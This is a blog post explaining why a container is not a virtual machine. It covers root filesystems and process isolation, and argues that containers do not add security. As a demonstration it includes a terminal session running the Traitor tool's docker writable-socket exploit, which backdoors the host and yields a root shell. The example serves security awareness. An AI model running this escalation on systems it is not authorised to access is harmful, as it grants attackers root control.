---
title: A container is not a VM
date: 2021-05-10
---

For me, one of the most interesting technologies used by developers are containers. They're so popular that all programmers have used it, or at least heard about them. Yet, most people don't really know what they are, or how they work. We all have probably heard a definition similar to this one, — this one was given to me by one of my professors at university, but it's also [the definition Google gives to us](https://cloud.google.com/containers)—

> They are kind of like a more light-weight virtual machine

This is the first part of a series where I want to cover various topics about how Linux containers (Docker, Podman, ...) work based on my experience developing my own container runtime, [devenv](https://github.com/GuillemCastro/devenv).

## A container is not a VM

While not completely false, this is a very deceiving definition. Not only there use different technologies, but both (VMs and containers) also solve different problems —different solutions for different problems—, and behave completely differently. It's not a coincidence that containers seem hard to use at first, "*Why the container is killed when I press Ctrl+C? That doesn't happen with my VMs!*".

So, what is a container? A container is simply **a process** that we execute in an isolated environment. A container needs two things for creating an isolated environment,

* A root filesystem (rootfs), often called "images". Think of it as an operating system minus the kernel, anything else you'd find on a regular Linux machine is included (bash, libc, etc.). As for desktop/server installations they also come in distributions, so you can find rootfs for Ubuntu, CentOS, Alpine, etc. When used to distribute applications or services, the rootfs will also include them.

* A way to trick the process into thinking that it is alone in the machine. The process won't be able to interact with other processes, and won't be able to access your files.

Before I said that it's not false that a container is similar to a virtual machine, since also they also are isolated environments that execute one process, there are some differences though,

* The isolation is achieved by means of virtualization. The whole system, everything from the CPU to the memory or the external devices, is virtualized. We can even execute code meant for other architectures.

* In a VM the process that gets executed is almost always an operating system or a special program that can be booted by a bootloader.

For VMs isolation is a consequence of virtualization, for containers isolation is their main purpose. VMs isolate a whole system, containers just a process. The big difference is the problem they try to solve. Containers try to solve the problem "it runs on my machine/environment", by isolating the process from the rest of the machine, and packaging everything it needs (including an almost complete Linux distro, excluding the kernel).

Additionally, there are also security concerns. As a general rule, you should never run untrusted code on your machine. There's no a safe way to execute it. If you *really* need to do it, it's better to do it in a virtual machine rather than directly in your machine. Because, yes, running something inside a container is not safer that outside of it. For example, Docker can be used to gain root access,

```
> id
uid=1000(castrog) gid=1000(castrog) groups=1000(castrog),27(sudo),132(libvirt),998(docker)

> traitor --exploit docker:writable-socket

 888                    d8b 888                    
 888                    Y8P 888                    
 888                        888                    
 888888 888d888 8888b.  888 888888 .d88b.  888d888 
 888    888P"      "88b 888 888   d88""88b 888P"   
 888    888    .d888888 888 888   888  888 888     
 Y88b.  888    888  888 888 Y88b. Y88..88P 888     
  "Y888 888    "Y888888 888  "Y888 "Y88P"  888     
    v0.0.0 | https://github.com/liamg/traitor 
 
[+] Assessing machine state...
[+] Checking for opportunities...
[+][docker:writable-socket] Docker socket at /var/run/docker.sock is writable!
[+][docker:writable-socket] Opportunity found, trying to exploit it...
[+][docker:writable-socket] Building malicious docker image...
[+][docker:writable-socket] Creating evil container...
[+][docker:writable-socket] Starting evil container...
[+][docker:writable-socket] Backdooring host at /usr/bin/SD0VGVY-w from guest...
[+][docker:writable-socket] Checking permissions...
[+][docker:writable-socket] Starting root shell...
[+][docker:writable-socket] Removing backdoor from host...
[+][docker:writable-socket] Removing container...
[+][docker:writable-socket] Cleaning up image...
[+][docker:writable-socket] Dropping you into a shell...

# id
uid=0(root) gid=0(root) groups=0(root)
```

[Traitor](https://github.com/liamg/traitor) is a tool to test known privilege escalation bugs on Linux. In this case, I tried exploiting the "writable-socket" exploit for Docker. If Docker's socket `/var/run/docker.sock` is writable (by default it is for the `docker` group, into which they recommend to add your user), with an specially crafted container we can gain root permissions.

In the next post of this series, we will discuss the Linux kernel features that make containers possible.